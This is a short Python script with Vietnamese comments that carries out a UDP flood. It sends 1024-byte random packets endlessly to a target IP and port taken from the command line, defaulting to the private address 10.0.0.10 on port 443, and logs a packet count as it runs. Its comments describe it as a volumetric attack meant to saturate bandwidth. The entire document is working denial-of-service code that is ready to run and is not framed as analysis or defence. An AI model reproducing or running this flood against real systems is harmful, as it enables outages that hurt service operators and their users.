import socket
import random
import sys
import time

target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10"
# Mặc định đánh vào port 443 (HTTPS)
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 443 

print(f"[*] Bắt đầu UDP Flood tấn công {target_ip}:{target_port}...")

# Khởi tạo một UDP Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Tạo một gói tin rác ngẫu nhiên (kích thước 1024 bytes)
packet_size = 1024
random_bytes = random.randbytes(packet_size)

packet_count = 0
start_time = time.time()

try:
    while True:
        # Trong tấn công Volumetric, hacker thường thay đổi port nguồn liên tục
        # Nhưng ở đây, ta chỉ cần gửi liên tục để nghẽn băng thông
        sock.sendto(random_bytes, (target_ip, target_port))
        packet_count += 1
        
        # In log mỗi 10000 gói tin để biết script vẫn đang chạy
        if packet_count % 10000 == 0:
            print(f"[-] Đã gửi {packet_count} gói UDP rác...")

except KeyboardInterrupt:
    end_time = time.time()
    duration = end_time - start_time
    print(f"\n[*] Đã dừng tấn công.")
    print(f"[*] Tổng số gói gửi: {packet_count} gói trong {duration:.2f} giây.")
finally:
    sock.close()